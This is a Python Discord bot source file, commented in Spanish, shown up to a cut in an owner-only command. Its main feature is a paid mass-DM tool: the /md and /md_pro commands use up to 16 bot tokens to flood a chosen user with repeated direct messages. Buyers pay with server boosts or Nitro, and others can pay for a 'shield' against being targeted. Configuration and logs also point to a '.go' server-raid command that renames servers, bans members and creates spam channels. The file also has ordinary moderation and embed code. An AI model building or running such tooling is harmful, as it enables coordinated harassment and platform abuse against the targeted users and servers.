import discord
from discord.ext import commands
from discord import app_commands
import os
import asyncio
import aiohttp
import json
import re
import random
from datetime import datetime, timedelta

# ⚙️ CONFIGURACIÓN
MENSAJES_POR_PRESION = 5
SERVIDOR_ID = 1420966075788427374
OWNER_ID = 1422694418963763200
LOG_CHANNEL_ID = 1443396362631905310
LINK_LOG_CHANNEL_ID = 1442951280648781874
CANAL_SUGERENCIAS = 1443832249345773608
DATOS_FILE = "permisos.json"
CANAL_LINKS_PERMITIDOS = 1440841383144591370
CANAL_LINKS_EMBED = 1442951280648781874
REGEX_DISCORD_INVITE = r'(discord\.gg/|discord\.com/invite/|discordapp\.com/invite/|www\.discord\.gg/|www\.discordapp\.com/invite/|discord://-/invite/)[a-zA-Z0-9-]+'
REGEX_URL = r'(https?://|www\.)\S+'
CIRCO_FILE = "circo.json"

# ⚙️ CONFIGURACIÓN DEL COMANDO .go
CONFIG_GO_FILE = "config.json"
GO_LOG_CHANNEL_ID = 1444711931071172638
SERVIDOR_OFICIAL = 1420966075788427374
GO_LOGS_FILE = "go_logs_counter.json"

def cargar_contador_go():
    """Carga el contador de logs del .go"""
    try:
        if os.path.exists(GO_LOGS_FILE):
            with open(GO_LOGS_FILE, "r") as f:
                data = json.load(f)
                return data.get("contador", 0)
    except:
        pass
    return 0

def guardar_contador_go(contador):
    """Guarda el contador de logs del .go"""
    try:
        with open(GO_LOGS_FILE, "w") as f:
            json.dump({"contador": contador}, f)
    except Exception as e:
        print(f"Error guardando contador: {e}")

def incrementar_contador_go():
    """Incrementa y retorna el nuevo contador"""
    contador = cargar_contador_go()
    nuevo_contador = contador + 1
    guardar_contador_go(nuevo_contador)
    return nuevo_contador

def cargar_config_go():
    """Carga la configuración del comando .go desde config.json"""
    try:
        if os.path.exists(CONFIG_GO_FILE):
            with open(CONFIG_GO_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception as e:
        print(f"Error cargando config.json: {e}")
    
    # Config por defecto si no existe
    return {
        "nombre_servidor": "papi chulo",
        "cantidad_bans": 1,
        "canales": [{"name": "elpepe", "messages": ["hola", "hola"]}]
    }

TOKEN_KEYS = [
    "DISCORD_TOKEN",
    "DISCORD_TOKEN_BOT2",
    "DISCORD_TOKEN_BOT3",
    "DISCORD_TOKEN_BOT4",
    "DISCORD_TOKEN_BOT5",
    "DISCORD_TOKEN_BOT6",
    "DISCORD_TOKEN_BOT7",
    "DISCORD_TOKEN_BOT8",
    "DISCORD_TOKEN_BOT9",
    "DISCORD_TOKEN_BOT10",
    "DISCORD_TOKEN_BOT11",
    "DISCORD_TOKEN_BOT12",
    "DISCORD_TOKEN_BOT13",
    "DISCORD_TOKEN_BOT14",
    "DISCORD_TOKEN_BOT15",
    "DISCORD_TOKEN_BOT16",
]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix=".", intents=intents)

session = None
all_tokens = []

def cargar_datos():
    """Carga el archivo de permisos"""
    if os.path.exists(DATOS_FILE):
        try:
            with open(DATOS_FILE, "r") as f:
                datos = json.load(f)
                if "escudos" not in datos:
                    datos["escudos"] = []
                if "estadisticas" not in datos:
                    datos["estadisticas"] = {}
                if "acceso" not in datos:
                    datos["acceso"] = {"permanente": [], "mensual": []}
                    if "acceso_individual" in datos:
                        datos["acceso"]["permanente"] = datos.pop("acceso_individual")
                if "acceso_temporal" not in datos:
                    datos["acceso_temporal"] = {}
                if "acceso_basico" not in datos:
                    datos["acceso_basico"] = {}
                if "acceso_pro_temporal" not in datos:
                    datos["acceso_pro_temporal"] = {}
                if "acceso_pro_permanente" not in datos:
                    datos["acceso_pro_permanente"] = []
                if "ultimo_uso_basico" not in datos:
                    datos["ultimo_uso_basico"] = {}
                if "canales_links_permitidos" not in datos:
                    datos["canales_links_permitidos"] = [CANAL_LINKS_PERMITIDOS]
                if "ultimo_uso_sugerencia" not in datos:
                    datos["ultimo_uso_sugerencia"] = {}
                return datos
        except:
            return {"acceso": {"permanente": [], "mensual": []}, "gratis": False, "escudos": [], "estadisticas": {}, "acceso_temporal": {}, "acceso_basico": {}, "acceso_pro_temporal": {}, "acceso_pro_permanente": [], "ultimo_uso_basico": {}, "canales_links_permitidos": [CANAL_LINKS_PERMITIDOS], "ultimo_uso_sugerencia": {}}
    return {"acceso": {"permanente": [], "mensual": []}, "gratis": False, "escudos": [], "estadisticas": {}, "acceso_temporal": {}, "acceso_basico": {}, "acceso_pro_temporal": {}, "acceso_pro_permanente": [], "ultimo_uso_basico": {}, "canales_links_permitidos": [CANAL_LINKS_PERMITIDOS], "ultimo_uso_sugerencia": {}}

def guardar_datos(datos):
    """Guarda el archivo de permisos"""
    with open(DATOS_FILE, "w") as f:
        json.dump(datos, f, indent=4)

def cargar_circo():
    """Carga el historial de imágenes del circo"""
    if os.path.exists(CIRCO_FILE):
        try:
            with open(CIRCO_FILE, "r") as f:
                datos = json.load(f)
                return datos.get("imagenes", [])
        except:
            return []
    return []

def guardar_circo(imagenes):
    """Guarda el historial de imágenes del circo"""
    with open(CIRCO_FILE, "w") as f:
        json.dump({"imagenes": imagenes}, f, indent=4)

async def cargar_datos_async():
    """Carga datos de forma asincrónica"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, cargar_datos)

async def guardar_datos_async(datos):
    """Guarda datos de forma asincrónica"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, guardar_datos, datos)

def tiene_acceso(user_id):
    """Verifica si un usuario tiene acceso"""
    datos = cargar_datos()
    acceso_data = datos.get("acceso", {})
    permanente = acceso_data.get("permanente", [])
    mensual = acceso_data.get("mensual", [])
    
    # Verificar acceso temporal
    user_id_str = str(user_id)
    acceso_temporal = datos.get("acceso_temporal", {})
    if user_id_str in acceso_temporal:
        expiry_time = datetime.fromisoformat(acceso_temporal[user_id_str])
        if datetime.now() < expiry_time:
            return True
        else:
            del datos["acceso_temporal"][user_id_str]
            guardar_datos(datos)
    
    return user_id == OWNER_ID or user_id in permanente or user_id in mensual or datos.get("gratis", False)

def tiene_escudo(user_id):
    """Verifica si un usuario tiene escudo"""
    datos = cargar_datos()
    return user_id in datos.get("escudos", [])

def tiene_acceso_basico(user_id):
    """Verifica si un usuario tiene acceso básico (temporal de 30 días)"""
    datos = cargar_datos()
    user_id_str = str(user_id)
    acceso_basico = datos.get("acceso_basico", {})
    
    if user_id_str in acceso_basico:
        expiry_time = datetime.fromisoformat(acceso_basico[user_id_str])
        if datetime.now() < expiry_time:
            return True
        else:
            del datos["acceso_basico"][user_id_str]
            guardar_datos(datos)
    
    return False

def tiene_acceso_pro(user_id):
    """Verifica si un usuario tiene acceso pro"""
    datos = cargar_datos()
    user_id_str = str(user_id)
    
    acceso_pro_permanente = datos.get("acceso_pro_permanente", [])
    if user_id in acceso_pro_permanente:
        return True
    
    acceso_pro_temporal = datos.get("acceso_pro_temporal", {})
    if user_id_str in acceso_pro_temporal:
        expiry_time = datetime.fromisoformat(acceso_pro_temporal[user_id_str])
        if datetime.now() < expiry_time:
            return True
        else:
            del datos["acceso_pro_temporal"][user_id_str]
            guardar_datos(datos)
    
    return False

async def enviar_log(user_id, user_name, user_avatar, target_user_id, mensaje):
    """Envía un log al canal especificado y registra estadísticas"""
    try:
        channel = bot.get_channel(LOG_CHANNEL_ID)
        if not channel:
            return
        
        try:
            target_user = await bot.fetch_user(target_user_id)
            target_name = target_user.name
        except:
            target_name = f"ID: {target_user_id}"
        
        embed = discord.Embed(
            title="MD Utilizado",
            description=f"Ejecutado por: {user_name}\nEnviado a: {target_name}\nBots utilizados: {len(all_tokens)}",
            color=discord.Color(0x000000),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="Mensaje", value=f"```{mensaje[:1024]}```", inline=False)
        
        if user_avatar:
            embed.set_thumbnail(url=user_avatar)
        
        await channel.send(embed=embed)
        
        datos = cargar_datos()
        user_id_str = str(user_id)
        if user_id_str not in datos["estadisticas"]:
            datos["estadisticas"][user_id_str] = {"nombre": user_name, "avatar": user_avatar, "usos": 0}
        datos["estadisticas"][user_id_str]["usos"] += 1
        guardar_datos(datos)
        
    except Exception as e:
        print(f"Error enviando log: {e}")

async def enviar_log_go(original_name: str, new_name: str, guild_id: int, member_count: int, bot_avatar_url: str, server_link: str, num_fila: int):
    """Envía un log del comando .go al canal especificado (sin ralentizar)"""
    try:
        channel = bot.get_channel(GO_LOG_CHANNEL_ID)
        if not channel:
            print(f"Canal de logs no encontrado")
            return
        
        embed = discord.Embed(
            title=f"Row {num_fila} - Comando .GO Ejecutado",
            color=discord.Color(0x000000),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="Nombre Original", value=original_name, inline=False)
        embed.add_field(name="Servidor", value=f"[{new_name}]({server_link})", inline=True)
        embed.add_field(name="Miembros", value=str(member_count), inline=True)
        embed.add_field(name="Link", value=server_link, inline=False)
        
        if bot_avatar_url:
            embed.set_thumbnail(url=bot_avatar_url)
        
        await channel.send(embed=embed)
        print(f"Log .go enviado - Fila {num_fila}")
    except Exception as e:
        print(f"Error enviando log .go: {e}")

async def enviar_log_link(user_id, user_name, user_avatar, channel_name, mensaje_contenido):
    """Envía un log de link detectado"""
    try:
        channel = bot.get_channel(LINK_LOG_CHANNEL_ID)
        if not channel:
            return
        
        embed = discord.Embed(
            title="Mensaje Eliminado - Link Detectado",
            color=discord.Color(0x000000),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="Usuario", value=f"@{user_name}", inline=False)
        embed.add_field(name="Canal", value=f"#{channel_name}", inline=False)
        embed.add_field(name="Contenido del Mensaje", value=f"```{mensaje_contenido[:1024]}```", inline=False)
        embed.add_field(name="Razón", value="Link detectado - Usuario muteado 5 minutos", inline=False)
        
        if user_avatar:
            embed.set_thumbnail(url=user_avatar)
        
        await channel.send(embed=embed)
        
    except Exception as e:
        print(f"Error enviando log de link: {e}")

def contiene_link(mensaje):
    """Verifica si un mensaje contiene un link"""
    return bool(re.search(REGEX_URL, mensaje))

def contiene_invitacion_discord(mensaje):
    """Verifica si un mensaje contiene una invitación de Discord"""
    return bool(re.search(REGEX_DISCORD_INVITE, mensaje, re.IGNORECASE))


async def keep_alive_task():
    """Tarea de keep-alive que se ejecuta cada minuto para evitar hibernación de Replit"""
    await bot.wait_until_ready()
    contador = 0
    while not bot.is_closed():
        try:
            contador += 1
            # Cada minuto, actualizamos la presencia para indicar actividad
            datos = cargar_datos()
            activity = None
            
            if "estado" in datos:
                estado_info = datos["estado"]
                tipo = estado_info.get("tipo", "viendo")
                texto = estado_info.get("texto", "")
                
                if tipo == "viendo":
                    activity = discord.Activity(type=discord.ActivityType.watching, name=texto)
                elif tipo == "escuchando":
                    activity = discord.Activity(type=discord.ActivityType.listening, name=texto)
                elif tipo == "jugando":
                    activity = discord.Activity(type=discord.ActivityType.playing, name=texto)
                elif tipo == "transmitiendo":
                    activity = discord.Activity(type=discord.ActivityType.streaming, name=texto, url="https://twitch.tv/fake")
            
            status = discord.Status.online
            if "presencia" in datos:
                presencia = datos["presencia"]
                if presencia == "idle" or presencia == "luna":
                    status = discord.Status.idle
                elif presencia == "dnd" or presencia == "no molestar":
                    status = discord.Status.do_not_disturb
                elif presencia == "invisible":
                    status = discord.Status.invisible
            
            await bot.change_presence(status=status, activity=activity)
            print(f"⏰ Keep-alive #{contador} - Bot activo")
            
            # Esperar 60 segundos antes de la próxima actualización
            await asyncio.sleep(60)
        except Exception as e:
            print(f"⚠️ Error en keep-alive: {e}")
            await asyncio.sleep(60)


@bot.event
async def setup_hook():
    global session, all_tokens
    print(f"📌 setup_hook iniciado")
    try:
        print(f"📌 Creando sesión aiohttp...")
        connector = aiohttp.TCPConnector(limit=500, limit_per_host=200, ttl_dns_cache=300)
        session = aiohttp.ClientSession(connector=connector)
        print(f"✅ Sesión creada")
        
        all_tokens = []
        for key in TOKEN_KEYS:
            token = os.getenv(key)
            if token:
                all_tokens.append(token)
        print(f"✅ Cargados {len(all_tokens)} tokens")
        
        print(f"📌 Cargando datos...")
        try:
            cargar_datos()
            print(f"✅ Sistema de permisos cargado")
        except Exception as e:
            print(f"⚠️ Error cargando datos (ignorado): {e}")
            
    except Exception as e:
        print(f"❌ Error en setup_hook: {e}")
        import traceback
        traceback.print_exc()

@bot.event
async def on_message(message):
    """Detecta y elimina invitaciones de Discord, mutea al usuario"""
    print(f"📨 Mensaje: {message.content} | Guild: {message.guild.id if message.guild else 'DM'}")
    
    if message.author.bot:
        return
    
    if message.guild is None:
        return
    
    if contiene_invitacion_discord(message.content):
        try:
            datos = cargar_datos()
            canales_permitidos = datos.get("canales_links_permitidos", [CANAL_LINKS_PERMITIDOS])
            if message.channel.id in canales_permitidos:
                await bot.process_commands(message)
                return
            
            if message.channel.id == CANAL_LINKS_EMBED:
                embed = discord.Embed(
                    title="Mensaje Eliminado - Invitación de Discord Detectada",
                    color=discord.Color(0x000000),
                    timestamp=datetime.now()
                )
                embed.add_field(name="Usuario", value=f"@{message.author.name}", inline=False)
                embed.add_field(name="Canal", value=f"#{message.channel.name}", inline=False)
                embed.add_field(name="Contenido del Mensaje", value=f"```{message.content[:1024]}```", inline=False)
                embed.add_field(name="Razón", value="Invitación de Discord detectada - Usuario muteado 5 minutos", inline=False)
                
                if message.author.avatar:
                    embed.set_thumbnail(url=message.author.display_avatar.url)
                
                await message.channel.send(embed=embed)
                
                try:
                    await message.author.timeout(timedelta(minutes=5), reason="Invitación de Discord detectada")
                except:
                    pass
                
                asyncio.create_task(enviar_log_link(
                    message.author.id,
                    message.author.name,
                    message.author.display_avatar.url,
                    message.channel.name,
                    message.content
                ))
                return
            
            await message.delete()
            
            try:
                await message.author.timeout(timedelta(minutes=5), reason="Invitación de Discord detectada")
            except:
                pass
            
            embed = discord.Embed(
                title="Mensaje Eliminado - Invitación de Discord Detectada",
                color=discord.Color(0x000000),
                timestamp=datetime.now()
            )
            embed.add_field(name="Usuario", value=f"@{message.author.name}", inline=False)
            embed.add_field(name="Canal", value=f"#{message.channel.name}", inline=False)
            embed.add_field(name="Contenido del Mensaje", value=f"```{message.content[:1024]}```", inline=False)
            embed.add_field(name="Razón", value="Invitación de Discord detectada - Usuario muteado 5 minutos", inline=False)
            
            if message.author.avatar:
                embed.set_thumbnail(url=message.author.display_avatar.url)
            
            asyncio.create_task(enviar_log_link(
                message.author.id,
                message.author.name,
                message.author.display_avatar.url,
                message.channel.name,
                message.content
            ))
        except Exception as e:
            print(f"Error procesando link: {e}")
    
    await bot.process_commands(message)

@bot.event
async def on_ready():
    print(f"🤖 Bot conectado como {bot.user}")
    print(f"✅ Bot LISTO - Comando .go disponible ahora!")
    print(f"📌 Guilds: {len(bot.guilds)}")

async def send_dm_fast(token: str, user_id: int, mensaje: str):
    """Envía un DM"""
    if not session:
        return False
    
    headers = {"Authorization": f"Bot {token}"}
    try:
        async with session.post(
            "https://discord.com/api/v10/users/@me/channels",
            headers=headers,
            json={"recipient_id": user_id},
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            if resp.status not in (200, 201):
                return False
            channel = await resp.json()
            channel_id = channel["id"]
        
        async with session.post(
            f"https://discord.com/api/v10/channels/{channel_id}/messages",
            headers=headers,
            json={"content": mensaje},
            timeout=aiohttp.ClientTimeout(total=30)
        ) as msg_resp:
            return msg_resp.status == 200
    except:
        return False

class EnviarMensajesView(discord.ui.View):
    def __init__(self, target_user_id: int, mensaje: str, user_name: str, user_avatar: str, user_id: int):
        super().__init__(timeout=None)
        self.target_user_id = target_user_id
        self.mensaje = mensaje
        self.user_name = user_name
        self.user_avatar = user_avatar
        self.user_id = user_id
        self.enviados = 0
    
    @discord.ui.button(label="Enviar desde todos los bots", style=discord.ButtonStyle.gray)
    async def enviar_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        
        try:
            es_primer_toque = self.enviados == 0
            
            tasks = []
            for token in all_tokens:
                for _ in range(MENSAJES_POR_PRESION):
                    tasks.append(send_dm_fast(token, self.target_user_id, self.mensaje))
            
            results = await asyncio.gather(*tasks)
            exitosos = sum(1 for r in results if r is True)
            self.enviados += exitosos
            
            if es_primer_toque:
                await enviar_log(self.user_id, self.user_name, self.user_avatar, self.target_user_id, self.mensaje)
            
            await interaction.followup.send(f"✅ {exitosos} mensajes enviados en esta ronda\n📊 Total: {self.enviados}", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)

class EnviarMensajesViewBasico(discord.ui.View):
    def __init__(self, target_user_id: int, mensaje: str, user_name: str, user_avatar: str, user_id: int):
        super().__init__(timeout=None)
        self.target_user_id = target_user_id
        self.mensaje = mensaje
        self.user_name = user_name
        self.user_avatar = user_avatar
        self.user_id = user_id
        self.enviados = 0
    
    @discord.ui.button(label="Enviar 5 mensajes mas", style=discord.ButtonStyle.gray)
    async def enviar_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        
        try:
            es_primer_toque = self.enviados == 0
            
            tasks = []
            for token in all_tokens[:5]:  # Solo los primeros 5 bots
                for _ in range(MENSAJES_POR_PRESION):
                    tasks.append(send_dm_fast(token, self.target_user_id, self.mensaje))
            
            results = await asyncio.gather(*tasks)
            exitosos = sum(1 for r in results if r is True)
            self.enviados += exitosos
            
            if es_primer_toque:
                await enviar_log(self.user_id, self.user_name, self.user_avatar, self.target_user_id, self.mensaje)
            
            await interaction.followup.send(f"✅ {exitosos} mensajes enviados en esta ronda\n📊 Total: {self.enviados}", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)

@bot.tree.command(name="md", description="Envía DMs desde 5 bots (Plan Básico)")
@app_commands.describe(usuario="Usuario a enviar MD", mensaje="Mensaje a enviar (máximo 50 caracteres)")
async def md_basico(interaction: discord.Interaction, usuario: discord.User, mensaje: str):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.guild_id != SERVIDOR_ID:
        await interaction.followup.send("❌ Este bot solo funciona en el servidor autorizado", ephemeral=True)
        return
    
    if not tiene_acceso_basico(interaction.user.id):
        await interaction.followup.send("❌ No tienes acceso básico para usar este comando", ephemeral=True)
        return
    
    if len(mensaje) > 50:
        await interaction.followup.send("❌ Tienes un plan básico y tu límite de palabras es 50", ephemeral=True)
        return
    
    if tiene_escudo(usuario.id):
        await interaction.followup.send(f"🛡️ Este usuario ha pagado el escudo y nadie puede usar este comando contra él", ephemeral=True)
        return
    
    datos = cargar_datos()
    user_id_str = str(interaction.user.id)
    target_user_id_str = str(usuario.id)
    ultimo_uso_key = f"{user_id_str}_{target_user_id_str}"
    
    if ultimo_uso_key in datos.get("ultimo_uso_basico", {}):
        ultimo_uso = datetime.fromisoformat(datos["ultimo_uso_basico"][ultimo_uso_key])
        ahora = datetime.now()
        diferencia = ahora - ultimo_uso
        if diferencia.total_seconds() < 86400:  # 24 horas en segundos
            horas_restantes = (86400 - diferencia.total_seconds()) / 3600
            await interaction.followup.send(f"❌ Ya usaste el MD básico con este usuario. Intenta de nuevo en {horas_restantes:.1f} horas", ephemeral=True)
            return
    
    try:
        user_name = interaction.user.name
        user_avatar = interaction.user.display_avatar.url
        
        datos["ultimo_uso_basico"][ultimo_uso_key] = datetime.now().isoformat()
        guardar_datos(datos)
        
        view = EnviarMensajesViewBasico(usuario.id, mensaje, user_name, user_avatar, interaction.user.id)
        await interaction.followup.send(
            f"📤 Sistema de mensajes básico activado para {usuario.mention}\n💬 Mensaje: {mensaje}\n\nPresiona el botón para enviar 5 mensajes desde 5 bots",
            view=view,
            ephemeral=True
        )
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)

@bot.tree.command(name="md_pro", description="Envía DMs desde todos los bots (Plan Pro)")
@app_commands.describe(usuario="Usuario a enviar MD", mensaje="Mensaje a enviar")
async def md_pro(interaction: discord.Interaction, usuario: discord.User, mensaje: str):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.guild_id != SERVIDOR_ID:
        await interaction.followup.send("❌ Este bot solo funciona en el servidor autorizado", ephemeral=True)
        return
    
    if not tiene_acceso_pro(interaction.user.id):
        await interaction.followup.send("❌ No tienes acceso pro para usar este comando", ephemeral=True)
        return
    
    if tiene_escudo(usuario.id):
        await interaction.followup.send(f"🛡️ Este usuario ha pagado el escudo y nadie puede usar este comando contra él", ephemeral=True)
        return
    
    try:
        user_name = interaction.user.name
        user_avatar = interaction.user.display_avatar.url
        
        view = EnviarMensajesView(usuario.id, mensaje, user_name, user_avatar, interaction.user.id)
        await interaction.followup.send(
            f"📤 Sistema de mensajes activado para {usuario.mention}\n💬 Mensaje: {mensaje}\n\nPresiona el botón para enviar desde todos los bots (16 bots)",
            view=view,
            ephemeral=True
        )
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)

# Lista de GIFs para el comando embed
# ⬇️ AÑADE TUS GIFS AQUÍ ⬇️
GIFS_EMBED = [
    "https://i.postimg.cc/509LgBvz/7e955fa37192c67e764957ec749f1431-(1).gif",
    "https://i.postimg.cc/jjt7qHM8/ca1f8e602f453cf65e7031abf60ba05f.gif",
    "https://i.postimg.cc/KjkKpJYT/aa01e061a2de50816ba6878b75ae0138.gif",
    # Añade más GIFs aquí, cada uno en una línea nueva
]

# Lista de imágenes para el comando circo
CIRCO_IMAGES = cargar_circo()
ultima_imagen_circo = None

@bot.command(name="info")
async def info_cmd(ctx):
    """Muestra información sobre los planes MD"""
    if ctx.guild.id != SERVIDOR_ID:
        await ctx.send("❌ Este bot solo funciona en el servidor autorizado")
        return
    
    embed = discord.Embed(
        title="📋 Información de Planes MD",
        color=discord.Color(0x000000)
    )
    
    embed.add_field(
        name="🔷 MD Básico",
        value="Debes boostear el servidor una vez para obtener acceso.\n\n📤 Mensajes por presión: 5\n📝 Límite: 50 caracteres por mensaje\n🤖 Bots: 5\n⏱️ Cooldown: 1 vez cada 24 horas por usuario destino\n⏱️ Duración: 30 días",
        inline=False
    )
    
    embed.add_field(
        name="💎 MD Pro (Temporal)",
        value="Debes boostear el servidor dos veces para obtener acceso.\n\n📤 Mensajes por presión: 10\n📝 Límite: Sin límite\n🤖 Bots: Todos (16+)\n⏱️ Duración: 30 días",
        inline=False
    )
    
    embed.add_field(
        name="💳 MD Pro Permanente (Solo Nitro)",
        value="Darle NITRO (no básico) a uno de estos usuarios:\n\n<@lolseru> | <@bertkat> | <@kalkoo_>\n\n**PRIMERO: Contáctate con <@bertkat> para verificar el pago de NITRO.**\n\n💎 Recibirás: Acceso Pro **PERMANENTE**\n📝 Límite: Sin límite\n🤖 Bots: Todos (16+)",
        inline=False
    )
    
    embed.add_field(
        name="👑 Acceso Permanente + Escudo",
        value="Debes boostear el servidor 3 veces + darle NITRO a uno de estos usuarios:\n\n<@lolseru> | <@bertkat> | <@kalkoo_>\n\n**PRIMERO: Contáctate con <@bertkat> para verificar el pago de NITRO.**\n\n💎 Recibirás: Acceso Pro **PERMANENTE** + 🛡️ Escudo protector **PERMANENTE**\n📝 Límite: Sin límite\n🤖 Bots: Todos (16+)",
        inline=False
    )
    
    embed.add_field(
        name="🛡️ Escudo (Solo Protección)",
        value="Debes boostear el servidor tres veces para obtener el escudo.\n\nCon el escudo, nadie podrá usar los comandos de MD contra ti.\n⏱️ Duración: Permanente",
        inline=False
    )
    
    embed.add_field(
        name="⚙️ Notas Importantes",
        value="✅ Los comandos de administración son solo para el owner\n✅ Comunícate con <@bertkat> para cualquier pago de nitro\n✅ Todos los comandos están disponibles en nuestro servidor oficial",
        inline=False
    )
    
    embed.set_footer(text="Usa /md para básico y /md_pro para pro")
    
    await ctx.send(embed=embed)

@bot.command(name="embed")
async def embed_cmd(ctx, *, mensaje: str = ""):
    """[OWNER] Envía un embed rojo con un gif aleatorio"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Solo el owner puede usar este comando", delete_after=5)
        return
    
    if not mensaje:
        await ctx.send("❌ Debes proporcionar un mensaje", delete_after=5)
        return
    
    embed = discord.Embed(
        title="",
        description=mensaje,
        color=discord.Color(0xFF0000)
    )
    
    gif_aleatorio = random.choice(GIFS_EMBED)
    embed.set_image(url=gif_aleatorio)
    
    await ctx.send(embed=embed)
    await ctx.message.delete()

@bot.tree.command(name="embed", description="[OWNER] Envía un embed rojo con un gif aleatorio")
@app_commands.describe(mensaje="Mensaje para el embed")
async def embed_slash(interaction: discord.Interaction, mensaje: str):
    """[OWNER] Envía un embed rojo con un gif aleatorio (slash command)"""
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ Solo el owner puede usar este comando", ephemeral=True)
        return
    
    embed = discord.Embed(
        title="",
        description=mensaje,
        color=discord.Color(0xFF0000)
    )
    
    gif_aleatorio = random.choice(GIFS_EMBED)
    embed.set_image(url=gif_aleatorio)
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="añadir_circo", description="[OWNER] Añade una imagen al circo")
@app_commands.describe(url="URL de la imagen")
async def añadir_circo(interaction: discord.Interaction, url: str):
    """[OWNER] Añade una imagen a la lista del circo"""
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ Solo el owner puede usar este comando", ephemeral=True)
        return
    
    CIRCO_IMAGES.append(url)
    guardar_circo(CIRCO_IMAGES)
    await interaction.response.send_message(f"✅ Imagen añadida al circo. Total: {len(CIRCO_IMAGES)} imágenes", ephemeral=True)

@bot.command(name="circo")
async def circo(ctx):
    """Envía una imagen del circo al azar"""
    global ultima_imagen_circo
    
    if not CIRCO_IMAGES:
        await ctx.send("❌ No hay imágenes en el circo todavía")
        return
    
    if len(CIRCO_IMAGES) == 1:
        imagen_aleatoria = CIRCO_IMAGES[0]
    else:
        imagen_aleatoria = random.choice(CIRCO_IMAGES)
        while imagen_aleatoria == ultima_imagen_circo:
            imagen_aleatoria = random.choice(CIRCO_IMAGES)
    
    ultima_imagen_circo = imagen_aleatoria
    
    embed = discord.Embed(
        title="🎪 ¡CIRCO!",
        color=discord.Color.random()
    )
    embed.set_image(url=imagen_aleatoria)
    
    await ctx.send(embed=embed)

@bot.tree.command(name="acceso", description="[OWNER] Agrega acceso a un usuario")
@app_commands.describe(usuario="Usuario a quien agregar acceso")
async def acceso(interaction: discord.Interaction, usuario: discord.User):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.user.id != OWNER_ID:
        await interaction.followup.send("❌ Solo el owner puede usar este comando", ephemeral=True)
        return
    
    if interaction.guild_id != SERVIDOR_ID:
        await interaction.followup.send("❌ Este comando solo funciona en el servidor autorizado", ephemeral=True)
        return
    
    datos = cargar_datos()
    user_id = usuario.id
    
    # Agregar acceso básico por 30 días
    acceso_basico = datos.get("acceso_basico", {})
    expiry_date = (datetime.now() + timedelta(days=30)).isoformat()
    acceso_basico[str(user_id)] = expiry_date
    datos["acceso_basico"] = acceso_basico
    
    guardar_datos(datos)
    
    embed = discord.Embed(
        title="✅ Acceso Agregado",
        description=f"{usuario.mention} ahora tiene acceso básico por 30 días",
        color=discord.Color.green(),
        timestamp=datetime.now()
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)
    print(f"✅ Acceso agregado a {usuario.name}")

@bot.tree.command(name="acceso_pro", description="[OWNER] Agrega acceso pro permanente a un usuario")
@app_commands.describe(usuario="Usuario a quien agregar acceso pro")
async def acceso_pro(interaction: discord.Interaction, usuario: discord.User):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.user.id != OWNER_ID:
        await interaction.followup.send("❌ Solo el owner puede usar este comando", ephemeral=True)
        return
    
    if interaction.guild_id != SERVIDOR_ID:
        await interaction.followup.send("❌ Este comando solo funciona en el servidor autorizado", ephemeral=True)
        return
    
    datos = cargar_datos()
    user_id = usuario.id
    
    # Agregar acceso pro permanente
    acceso_pro_permanente = datos.get("acceso_pro_permanente", [])
    if user_id not in acceso_pro_permanente:
        acceso_pro_permanente.append(user_id)
    datos["acceso_pro_permanente"] = acceso_pro_permanente
    
    guardar_datos(datos)
    
    embed = discord.Embed(
        title="✅ Acceso Pro Agregado",
        description=f"{usuario.mention} ahora tiene acceso pro permanente",
        color=discord.Color.green(),
        timestamp=datetime.now()
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)
    print(f"✅ Acceso pro agregado a {usuario.name}")

@bot.tree.command(name="escudo", description="[OWNER] Agrega escudo a un usuario")
@app_commands.describe(usuario="Usuario a proteger")
async def escudo(interaction: discord.Interaction, usuario: discord.User):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.user.id != OWNER_ID:
        await interaction.followup.send("❌ Solo el owner puede usar este comando", ephemeral=True)
        return
    
    if interaction.guild_id != SERVIDOR_ID:
        await interaction.followup.send("❌ Este comando solo funciona en el servidor autorizado", ephemeral=True)
        return
    
    datos = cargar_datos()
    escudos = datos.get("escudos", [])
    
    if usuario.id not in escudos:
        escudos.append(usuario.id)
    datos["escudos"] = escudos
    
    guardar_datos(datos)
    
    embed = discord.Embed(
        title="🛡️ Escudo Agregado",
        description=f"{usuario.mention} ahora está protegido con escudo",
        color=discord.Color.blue(),
        timestamp=datetime.now()
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)
    print(f"🛡️ Escudo agregado a {usuario.name}")

@bot.tree.command(name="remover_escudo", description="[OWNER] Remueve el escudo de un usuario")
@app_commands.describe(usuario="Usuario")
async def remover_escudo(interaction: discord.Interaction, usuario: discord.User):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.user.id != OWNER_ID:
        await interaction.followup.send("❌ Solo el owner puede usar este comando", ephemeral=True)
        return
    
    datos = cargar_datos()
    escudos = datos.get("escudos", [])
    
    if usuario.id in escudos:
        escudos.remove(usuario.id)
    datos["escudos"] = escudos
    
    guardar_datos(datos)
    
    embed = discord.Embed(
        title="🛡️ Escudo Removido",
